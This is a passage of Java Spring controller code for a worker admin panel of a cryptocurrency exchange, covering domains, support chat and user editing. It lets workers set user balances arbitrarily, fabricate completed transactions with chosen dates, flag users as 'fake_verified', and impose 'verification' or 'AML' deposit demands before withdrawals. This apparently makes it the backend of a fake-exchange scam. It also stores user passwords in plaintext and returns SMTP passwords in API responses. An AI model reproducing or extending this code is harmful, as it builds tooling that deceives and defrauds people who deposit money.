        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editMinWithdraw(Authentication authentication, Map<String, Object> data) {
        double minWithdrawAmount = getDoubleValue(data, "min_withdraw_amount");
        if (Double.isNaN(minWithdrawAmount) || minWithdrawAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WorkerCoinSettings coinSettings = workerCoinSettingsRepository.findByWorkerId(worker.getId()).orElseThrow(() -> new RuntimeException("Worker coin settings not found for worker " + worker.getUser().getEmail()));

        coinSettings.setMinWithdrawAmount(minWithdrawAmount);

        workerCoinSettingsRepository.save(coinSettings);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> addWithdrawCoinLimit(Authentication authentication, Map<String, Object> data) {
        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_error");
        }

        Worker worker = workerService.getWorker(authentication);
        WithdrawCoinLimit withdrawCoinLimit = withdrawCoinLimitRepository.findByWorkerIdAndCoinId(worker.getId(), coin.getId()).orElse(null);
        if (withdrawCoinLimit == null) {
            withdrawCoinLimit = new WithdrawCoinLimit();
        }

        withdrawCoinLimit.setCoin(coin);
        withdrawCoinLimit.setMinAmount(amount);
        withdrawCoinLimit.setWorker(worker);

        withdrawCoinLimitRepository.save(withdrawCoinLimit);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteWithdrawCoinLimit(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);

        if (!withdrawCoinLimitRepository.existsByIdAndWorkerId(id, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        withdrawCoinLimitRepository.deleteById(id);

        return ResponseEntity.ok("success");
    }
    //end coins

    //start domains
    @PostMapping(value = "/domains")
    public ResponseEntity<String> domainsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "GET_DOMAIN" -> {
                return getDomain(authentication, data);
            }
            case "GET_EMAIL" -> {
                return getEmail(authentication, data);
            }
            case "GET_SOCIAL_NETWORKS" -> {
                return getSocialNetworks(authentication, data);
            }
            case "EDIT_SOCIAL_NETWORKS" -> {
                return editSocialNetworks(authentication, data);
            }
            case "EDIT_EMAIL" -> {
                return editEmail(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> getDomain(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        Optional<Domain> domainOptional = domainRepository.findByIdAndWorkerId(id, worker.getId());
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, String> map = new HashMap<>() {{
            put("name", domain.getName());
            put("exchange_name", domain.getExchangeName());
            put("icon", domain.getIcon());
            put("title", domain.getTitle());
            put("home_page", String.valueOf(domain.getNewHomePageDesign().ordinal()));
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> getEmail(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        Optional<Domain> domainOptional = domainRepository.findByIdAndWorkerId(id, worker.getId());
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, Object> map = new HashMap<>() {{
            put("enabled", domain.isEmailEnabled());
            put("required", domain.isEmailRequiredEnabled());
            put("server", domain.getServer());
            put("port", domain.getPort());
            put("email", domain.getEmail());
            put("password", domain.getPassword());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> getSocialNetworks(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        Optional<Domain> domainOptional = domainRepository.findByIdAndWorkerId(id, worker.getId());
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        Domain domain = domainOptional.get();

        Map<String, Object> map = new HashMap<>() {{
            put("listing_request", domain.getListingRequest());
            put("partnership", domain.getPartnership());
            put("twitter", domain.getTwitter());
            put("telegram", domain.getTelegram());
            put("instagram", domain.getInstagram());
            put("facebook", domain.getFacebook());
            put("reddit", domain.getReddit());

            put("listing_request_enabled", domain.isListingRequestEnabled());
            put("partnership_enabled", domain.isPartnershipEnabled());
            put("twitter_enabled", domain.isTwitterEnabled());
            put("telegram_enabled", domain.isTelegramEnabled());
            put("instagram_enabled", domain.isInstagramEnabled());
            put("facebook_enabled", domain.isFacebookEnabled());
            put("reddit_enabled", domain.isRedditEnabled());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> editEmail(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        String cooldownKey = worker.getId() + "-domains-edit";
        if (cooldownService.isCooldown(cooldownKey)) {
            return ResponseEntity.badRequest().body("cooldown:" + cooldownService.getCooldownLeft(cooldownKey));
        }

        Domain domain = domainRepository.findByIdAndWorkerId(id, worker.getId()).orElse(null);
        if (domain == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        boolean enabled = (boolean) data.get("enabled");
        boolean required = (boolean) data.get("required");

        String server = (String) data.get("server");
        if (enabled && !DataValidator.isDomainValided(server.toLowerCase())) {
            return ResponseEntity.badRequest().body("invalid_server");
        }
        int port = Integer.parseInt(String.valueOf(data.get("port")));
        if (enabled && port <= 0 || port > 65535) {
            return ResponseEntity.badRequest().body("invalid_port");
        }

        String email = String.valueOf(data.get("email")).toLowerCase();
        if (enabled && !DataValidator.isEmailValided(email)) {
            return ResponseEntity.badRequest().body("invalid_email");
        }

        String password = String.valueOf(data.get("password"));

        boolean validate = (!domain.isEmailEnabled() && enabled) || (enabled && (!domain.getServer().equals(server) || domain.getPort() != port || !domain.getEmail().equals(email) || !domain.getPassword().equals(password)));
        if (validate && !emailService.validateEmail(server, port, email, password)) {
            return ResponseEntity.badRequest().body("connection_error");
        }

        domain.setEmailEnabled(enabled);
        domain.setEmailRequiredEnabled(required);
        domain.setServer(server);
        domain.setPort(port);
        domain.setEmail(email);
        domain.setPassword(password);

        domainRepository.save(domain);

        cooldownService.addCooldown(cooldownKey, Duration.ofSeconds(30));

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editSocialNetworks(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);
        Domain domain = domainRepository.findByIdAndWorkerId(id, worker.getId()).orElse(null);
        if (domain == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        String listingRequest = String.valueOf(data.get("listing_request"));
        String partnership = String.valueOf(data.get("partnership"));
        String twitter = String.valueOf(data.get("twitter"));
        String telegram = String.valueOf(data.get("telegram"));
        String instagram = String.valueOf(data.get("instagram"));
        String facebook = String.valueOf(data.get("facebook"));
        String reddit = String.valueOf(data.get("reddit"));

        boolean listingRequestEnabled = (boolean) data.get("listing_request_enabled");
        boolean partnershipEnabled = (boolean) data.get("partnership_enabled");
        boolean twitterEnabled = (boolean) data.get("twitter_enabled");
        boolean telegramEnabled = (boolean) data.get("telegram_enabled");
        boolean instagramEnabled = (boolean) data.get("instagram_enabled");
        boolean facebookEnabled = (boolean) data.get("facebook_enabled");
        boolean redditEnabled = (boolean) data.get("reddit_enabled");

        domain.setListingRequest(listingRequest);
        domain.setPartnership(partnership);
        domain.setTwitter(twitter);
        domain.setTelegram(telegram);
        domain.setInstagram(instagram);
        domain.setFacebook(facebook);
        domain.setReddit(reddit);

        domain.setListingRequestEnabled(listingRequestEnabled);
        domain.setPartnershipEnabled(partnershipEnabled);
        domain.setTwitterEnabled(twitterEnabled);
        domain.setTelegramEnabled(telegramEnabled);
        domain.setInstagramEnabled(instagramEnabled);
        domain.setFacebookEnabled(facebookEnabled);
        domain.setRedditEnabled(redditEnabled);

        domainRepository.save(domain);

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "domains/edit")
    public ResponseEntity<String> domainsEditController(Authentication authentication, @RequestParam(value = "id") long id, @RequestParam("exchangeName") String exchangeName, @RequestParam(value = "title") String title, @RequestParam(value = "homePage") String homePage, @RequestParam(value = "icon", required = false) MultipartFile image) {
        if (!DataValidator.isTextValidedLowest(exchangeName.toLowerCase()) || !DataValidator.isTextValidedLowest(title.toLowerCase())) {
            return ResponseEntity.badRequest().body("name_title_error");
        }

        Worker worker = workerService.getWorker(authentication);
        Optional<Domain> domainOptional = domainRepository.findByIdAndWorkerId(id, worker.getId());
        if (domainOptional.isEmpty()) {
            return ResponseEntity.badRequest().body("not_found");
        }

        int homePageId = 0;
        try {
            homePageId = Integer.parseInt(homePage);
        } catch (Exception ex) {}

        if (homePageId < 0 || homePageId >= HomePageDesign.values().length) {
            return ResponseEntity.badRequest().body("error");
        }
        
        HomePageDesign homePageDesign = HomePageDesign.values()[homePageId];

        Domain domain = domainOptional.get();
        domain.setExchangeName(exchangeName);
        domain.setTitle(title);
        domain.setHomeDesign(homePageDesign.ordinal());

        if (image != null && image.getOriginalFilename() != null) {
            try {
                String fileName = worker.getId() + "_" + System.currentTimeMillis() + ".png";
                FileUploadUtil.saveFile(Resources.DOMAIN_ICONS_DIR, fileName, image);
                domain.setIcon("../" + Resources.DOMAIN_ICONS_DIR + "/" + fileName);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        domainRepository.save(domain);

        return ResponseEntity.ok("success");
    }
    //end domains

    //start support
    @PostMapping(value = "/support")
    public ResponseEntity<String> supportController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "GET_SUPPORT_USER" -> {
                return getSupportUser(authentication, data);
            }
            case "DELETE_SUPPORT_MESSAGE" -> {
                return deleteSupportMessage(authentication, data);
            }
            case "EDIT_SUPPORT_MESSAGE" -> {
                return editSupportMessage(authentication, data);
            }
            case "DELETE_SUPPORT_DIALOG" -> {
                return deleteSupportDialog(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> getSupportUser(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(id, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("error");
        }

        Map<String, Object> map = new HashMap<>() {{
            put("username", user.getUsername());
            put("email", user.getEmail());
            put("domain", user.getDomain());

            if (user.getProfilePhoto() != null) {
                put("profile_photo", user.getProfilePhoto());
            }

            put("online", user.isOnline());
        }};

        return ResponseEntity.ok(JsonUtil.writeJson(map));
    }

    private ResponseEntity<String> deleteSupportMessage(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));
        Worker worker = workerService.getWorker(authentication);

        UserSupportMessage supportMessage = userSupportMessageRepository.findByIdAndUserWorkerId(id, worker.getId()).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userSupportMessageRepository.deleteByIdAndUserId(id, supportMessage.getUser().getId());

        if (!supportMessage.isSupportViewed() || !supportMessage.isUserViewed()) {
            UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(supportMessage.getUser().getId()).orElse(null);

            if (userSupportDialog != null) {
                if (!supportMessage.isSupportViewed()) {
                    userSupportDialog.setSupportUnviewedMessages(userSupportDialog.getSupportUnviewedMessages() - 1);
                }
                if (!supportMessage.isUserViewed()) {
                    userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() - 1);
                }

                userSupportDialogRepository.save(userSupportDialog);
            }
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editSupportMessage(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("message_id")));

        String message = String.valueOf(data.get("message"));

        if (StringUtils.isBlank(message)) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }
        if (message.length() > 2000) {
            return ResponseEntity.badRequest().body("message_limit");
        }

        message = XSSUtils.stripXSS(message);

        Worker worker = workerService.getWorker(authentication);

        UserSupportMessage supportMessage = userSupportMessageRepository.findByIdAndUserWorkerId(id, worker.getId()).orElse(null);
        if (supportMessage == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        supportMessage.setMessage(message);

        userSupportMessageRepository.save(supportMessage);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> deleteSupportDialog(Authentication authentication, Map<String, Object> data) {
        long id = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(id, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        boolean ban = (boolean) data.get("ban");

        userSupportDialogRepository.deleteByUserId(id);

        userSupportMessageRepository.deleteAllByUserId(id);

        if (ban && worker.getUser().getId() != user.getId()) {
            EmailBan emailBan = new EmailBan();
            emailBan.setEmail(user.getEmail());
            emailBan.setUser(user);
            emailBan.setDate(new Date());

            emailBanRepository.save(emailBan);
        }

        return ResponseEntity.ok("success");
    }

    @PostMapping(value = "support/send")
    public ResponseEntity<String> supportSendController(Authentication authentication, @RequestParam(value = "user_id") String userId, @RequestParam(value = "message", required = false) String message, @RequestParam(value = "image", required = false) MultipartFile image) {
        if (StringUtils.isBlank(message) && image == null) {
            return ResponseEntity.badRequest().body("message_is_empty");
        }

        Worker worker = workerService.getWorker(authentication);
        if (cooldownService.isCooldown(worker.getId() + "-support")) {
            return ResponseEntity.badRequest().body("cooldown");
        }
        User user = userRepository.findByIdAndWorkerId(Long.parseLong(userId), worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        if (message != null) {
            if (StringUtils.isBlank(message)) {
                return ResponseEntity.badRequest().body("message_is_empty");
            }
            if (message.length() > 2000) {
                return ResponseEntity.badRequest().body("message_limit");
            }

            message = XSSUtils.stripXSS(message);

            UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.TEXT, message, false, true, user);

            createOrUpdateSupportDialog(supportMessage, user);

            userSupportMessageRepository.save(supportMessage);
        }

        if (image != null && image.getOriginalFilename() != null) {
            String fileName = user.getId() + "_" + System.currentTimeMillis() + ".png";
            try {
                FileUploadUtil.saveFile(Resources.SUPPORT_IMAGES, fileName, image);

                UserSupportMessage supportMessage = new UserSupportMessage(UserSupportMessage.Target.TO_USER, UserSupportMessage.Type.IMAGE, "../" + Resources.SUPPORT_IMAGES + "/" + fileName, false, true, user);

                createOrUpdateSupportDialog(supportMessage, user);

                userSupportMessageRepository.save(supportMessage);
            } catch (IOException e) {
                e.printStackTrace();
                return ResponseEntity.badRequest().body("upload_image_error");
            }
        }

        cooldownService.addCooldown(worker.getId() + "-support", Duration.ofMillis(500));

        return ResponseEntity.ok("success");
    }

    private void createOrUpdateSupportDialog(UserSupportMessage supportMessage, User user) {
        UserSupportDialog userSupportDialog = userSupportDialogRepository.findByUserId(user.getId()).orElse(null);
        if (userSupportDialog == null) {
            userSupportDialog = new UserSupportDialog();
        }

        userSupportDialog.setOnlyWelcome(false);
        userSupportDialog.setUserUnviewedMessages(userSupportDialog.getUserUnviewedMessages() + 1);
        userSupportDialog.setTotalMessages(userSupportDialog.getTotalMessages() + 1);
        userSupportDialog.setLastMessageDate(supportMessage.getCreated());
        userSupportDialog.setUser(user);

        userSupportDialogRepository.save(userSupportDialog);
    }
    //end support


    //start user-edit
    @PostMapping(value = "/user-edit")
    public ResponseEntity<String> userEditController(Authentication authentication, @RequestBody Map<String, Object> data) {
        String action = (String) data.get("action");
        switch (action) {
            case "EDIT_OVERVIEW" -> {
                return editOverview(authentication, data);
            }
            case "EDIT_KYC" -> {
                return editKyc(authentication, data);
            }
            case "SET_BALANCE" -> {
                return setBalance(authentication, data);
            }
            case "CREATE_TRANSACTION" -> {
                return createTransaction(authentication, data);
            }
            case "EDIT_TRANSACTION" -> {
                return editTransaction(authentication, data);
            }
            case "EDIT_TRANSACTION_AMOUNT" -> {
                return editTransactionAmount(authentication, data);
            }
            case "EDIT_WITHDRAW_VERIFY" -> {
                return editWithdrawVerify(authentication, data);
            }
            case "ADD_WITHDRAW_VERIFY_COIN" -> {
                return addWithdrawVerifyCoin(authentication, data);
            }
            case "DELETE_WITHDRAW_VERIFY_COIN" -> {
                return deleteWithdrawVerifyCoin(authentication, data);
            }
            default -> {
                return ResponseEntity.badRequest().body("invalid_action");
            }
        }
    }

    private ResponseEntity<String> editOverview(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        String username = (String) data.get("username");
        if (!DataValidator.isUsernameValided(username)) {
            return ResponseEntity.badRequest().body("username_error");
        }

        String password = XSSUtils.stripXSS((String) data.get("password"));
        if (password.length() < 8 || password.length() > 64) {
            return ResponseEntity.badRequest().body("password_error");
        }

        double firstDepositBonusAmount = getDoubleValue(data, "first_deposit_bonus_amount");

        if (firstDepositBonusAmount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        boolean firstDepositBonusEnabled = (boolean) data.get("first_deposit_bonus_enabled");
        boolean emailBanned = (boolean) data.get("ban_email");
        boolean twoFactorEnabled = (boolean) data.get("two_factor_enabled");
        boolean emailConfirmed = (boolean) data.get("email_confirmed");
        boolean fakeVerified = (boolean) data.get("fake_verified");

        Map<String, Boolean> featuresMap = (Map<String, Boolean>) data.get("features");
        Map<UserFeature.Type, Boolean> features = new HashMap<>();
        for (Map.Entry<String, Boolean> entry : featuresMap.entrySet()) {
            features.put(UserFeature.Type.valueOf(entry.getKey()), entry.getValue());
        }

        double depositCommission = getDoubleValue(data, "deposit_commission");
        if (depositCommission < -1) {
            depositCommission = -1;
        }

        double withdrawCommission = getDoubleValue(data, "withdraw_commission");
        if (withdrawCommission < -1) {
            withdrawCommission = -1;
        }

        String note = String.valueOf(data.get("note"));
        if (note.length() > 128) {
            return ResponseEntity.badRequest().body("note_length_error");
        }

        if (!note.equals(user.getNote()) || withdrawCommission != user.getWithdrawCommission() || depositCommission != user.getDepositCommission() || !user.getUsername().equals(username) || !user.getPassword().equals(password) || user.getFirstDepositBonusAmount() != firstDepositBonusAmount || user.isFirstDepositBonusEnabled() != firstDepositBonusEnabled || user.isTwoFactorEnabled() != twoFactorEnabled || user.isEmailConfirmed() != emailConfirmed || user.isFakeVerified() != fakeVerified) {
            user.setNote(note);
            user.setDepositCommission(depositCommission);
            user.setWithdrawCommission(withdrawCommission);
            user.setUsername(username);
            user.setPassword(password);
            user.setFirstDepositBonusAmount(firstDepositBonusAmount);
            user.setFirstDepositBonusEnabled(firstDepositBonusEnabled);
            user.setTwoFactorEnabled(twoFactorEnabled);
            user.setEmailConfirmed(emailConfirmed);
            user.setFakeVerified(fakeVerified);

            userRepository.save(user);

            userDetailsService.removeCache(user.getEmail());
        }

        boolean banned = emailBanRepository.existsByEmail(user.getEmail());
        if (banned != emailBanned) {
            if (emailBanned) {
                EmailBan emailBan = new EmailBan();
                emailBan.setEmail(user.getEmail());
                emailBan.setUser(user);
                emailBan.setDate(new Date());

                emailBanRepository.save(emailBan);
            } else {
                emailBanRepository.deleteByEmail(user.getEmail());
            }
        }

        List<UserFeature> userFeatures = userFeatureRepository.findAllByUserId(userId);
        for (Map.Entry<UserFeature.Type, Boolean> entry : features.entrySet()) {
            UserFeature userFeature = userFeatures.stream().filter(feat -> feat.getType() == entry.getKey()).findFirst().orElse(null);
            if (userFeature == null) {
                userFeature = new UserFeature();
                userFeature.setUser(user);
                userFeature.setType(entry.getKey());
            }

            userFeature.setEnabled(entry.getValue());

            userFeatureRepository.save(userFeature);
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editKyc(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        UserKyc userKyc = user.getUserKyc();

        if (userKyc == null) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        if (userKyc.isAccepted()) {
            return ResponseEntity.badRequest().body("kyc_error");
        }

        String type = (String) data.get("type");
        if (type.equals("ACCEPT")) {
            userKyc.setAccepted(true);
            userKycRepository.save(userKyc);
        } else if (type.equals("CANCEL")){
            userKycRepository.deleteById(userKyc.getId());
        }

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> setBalance(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double balance = getDoubleValue(data, "balance");
        if (Double.isNaN(balance) || balance < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        userService.setBalance(user, coin, balance);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> createTransaction(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);

        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount < 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long coinId = Long.parseLong(String.valueOf(data.get("coin")));
        Coin coin = coinRepository.findById(coinId).orElse(null);
        if (coin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        String typeName = (String) data.get("type");
        UserTransaction.Type type = UserTransaction.Type.valueOf(typeName);

        if (!type.isIncrementBalance()) {
            if (userService.getBalance(user, coin) - amount < 0) {
                return ResponseEntity.badRequest().body("user_no_balance");
            }
        }

        String dateString = (String) data.get("date");
        Date date = null;
        if (!StringUtils.isBlank(dateString)) {
            try {
                date = new Date(dateString);
            } catch (Exception ex) {
                date = new Date();
            }
        } else {
            date = new Date();
        }
        
        String address = data.containsKey("address") && data.get("address") != null ? String.valueOf(data.get("address")) : null;
        
        UserTransaction userTransaction = new UserTransaction();

        userTransaction.setUser(user);
        userTransaction.setAmount(amount);
        userTransaction.setType(type);
        userTransaction.setAddress(address);
        userTransaction.setStatus(UserTransaction.Status.COMPLETED);
        userTransaction.setDate(date);
        userTransaction.setCoinSymbol(coin.getSymbol());

        userTransactionRepository.save(userTransaction);

        userService.addBalance(user, coin, type.isIncrementBalance() ? amount : -amount);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editTransaction(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        Worker worker = workerService.getWorker(authentication);
        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserIdAndUserWorkerId(transactionId, userId, worker.getId()).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        String type = String.valueOf(data.get("type"));
        if (type.equals("DELETE")) {
            if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                return ResponseEntity.badRequest().body("not_editable");
            }

            userTransactionRepository.deleteById(transactionId);

            return ResponseEntity.ok("success");
        } else if(userTransaction.getStatus() == UserTransaction.Status.IN_PROCESSING) {
            if (type.equals("PAID_OUT")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT) {
                    UserDeposit userDeposit = userDepositRepository.findByTransactionId(transactionId).orElse(null);
                    if (userDeposit != null) {
                        userService.addBalance(userDeposit.getUser(), userTransaction.getCoinSymbol(), userDeposit.getAmount());
                    }
                }

                userTransaction.setStatus(UserTransaction.Status.COMPLETED);
                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            } else if (type.equals("CANCEL")) {
                if (userTransaction.getType() == UserTransaction.Type.DEPOSIT && userDepositRepository.existsByTransactionId(transactionId)) {
                    return ResponseEntity.badRequest().body("not_editable");
                }

                userService.addBalance(userTransaction.getUser(), userTransaction.getCoinSymbol(), userTransaction.getAmount());

                userTransaction.setStatus(UserTransaction.Status.CANCELED);

                userTransactionRepository.save(userTransaction);

                return ResponseEntity.ok("success");
            }
        }

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> editTransactionAmount(Authentication authentication, Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        long transactionId = Long.parseLong(String.valueOf(data.get("id")));

        Worker worker = workerService.getWorker(authentication);
        UserTransaction userTransaction = userTransactionRepository.findByIdAndUserIdAndUserWorkerId(transactionId, userId, worker.getId()).orElse(null);
        if (userTransaction == null) {
            return ResponseEntity.badRequest().body("not_found");
        }

        double amount = getDoubleValue(data, "amount");
        if (Double.isNaN(amount) || amount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        userTransaction.setAmount(amount);
        userTransactionRepository.save(userTransaction);

        return ResponseEntity.ok("success");
    }

    private ResponseEntity<String> editWithdrawVerify(Authentication authentication, Map<String, Object> data) {
        boolean verifModal = (boolean) data.get("verif_modal");
        boolean amlModal = (boolean) data.get("aml_modal");
        double verifAmount = getDoubleValue(data, "verif_amount");
        double btcVerifAmount = getDoubleValue(data, "btc_verif_amount");

        if (Double.isNaN(verifAmount) || verifAmount <= 0) {
            return ResponseEntity.badRequest().body("amount_error");
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);
        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        user.setVerificationModal(verifModal);
        user.setAmlModal(amlModal);
        user.setVerifDepositAmount(verifAmount);
        user.setBtcVerifDepositAmount(btcVerifAmount < 0 ? 0 : btcVerifAmount);

        userRepository.save(user);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> addWithdrawVerifyCoin(Authentication authentication, Map<String, Object> data) {
        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        Worker worker = workerService.getWorker(authentication);
        WorkerDepositCoin depositCoin = workerDepositCoinRepository.findByIdAndWorkerId(coinId, worker.getId()).orElse(null);
        if (depositCoin == null) {
            return ResponseEntity.badRequest().body("coin_not_found");
        }

        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        if (userRequiredDepositCoinRepository.existsByUserIdAndDepositCoinIdAndDepositCoinWorkerId(userId, coinId, worker.getId())) {
            return ResponseEntity.badRequest().body("already_exists");
        }

        User user = userRepository.findById(userId).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        UserRequiredDepositCoin userRequiredDepositCoin = new UserRequiredDepositCoin();
        userRequiredDepositCoin.setUser(user);
        userRequiredDepositCoin.setDepositCoin(depositCoin);

        userRequiredDepositCoinRepository.save(userRequiredDepositCoin);

        return ResponseEntity.ok("error");
    }

    private ResponseEntity<String> deleteWithdrawVerifyCoin(Authentication authentication, Map<String, Object> data) {
        long coinId = Long.parseLong(String.valueOf(data.get("coin_id")));
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);
        if (!userRequiredDepositCoinRepository.existsByIdAndUserIdAndDepositCoinWorkerId(coinId, userId, worker.getId())) {
            return ResponseEntity.badRequest().body("not_found");
        }

        userRequiredDepositCoinRepository.deleteById(coinId);

        return ResponseEntity.ok("error");
    }

    @PostMapping(value = "/user-edit/errors")
    public ResponseEntity<String> userEditErrorsController(Authentication authentication, @RequestBody Map<String, Object> data) {
        long userId = Long.parseLong(String.valueOf(data.get("user_id")));
        Worker worker = workerService.getWorker(authentication);
        User user = userRepository.findByIdAndWorkerId(userId, worker.getId()).orElse(null);
        if (user == null) {
            return ResponseEntity.badRequest().body("user_not_found");
        }

        Map<String, String> messagesMap = (Map<String, String>) data.get("messages");
        Map<ErrorMessage.ErrorMessageType, String> messages = new HashMap<>();
        for (Map.Entry<String, String> entry : messagesMap.entrySet()) {
            messages.put(ErrorMessage.ErrorMessageType.valueOf(entry.getKey()), entry.getValue());
        }

        for (Map.Entry<ErrorMessage.ErrorMessageType, String> entry : messages.entrySet()) {
            ErrorMessage.ErrorMessageType type = entry.getKey();
            String message = XSSUtils.sanitize(entry.getValue());
            String onlyMessage = user.getOnlyUserErrorMessage(type);
            if (onlyMessage != null && onlyMessage.equals(message)) {
                continue;
            }

            UserErrorMessage userErrorMessage = userErrorMessageRepository.findByUserIdAndType(user.getId(), type).orElse(null);
            if (userErrorMessage == null) {
                userErrorMessage = new UserErrorMessage();
                userErrorMessage.setUser(user);
                userErrorMessage.setType(type);
            }

            userErrorMessage.setMessage(message);

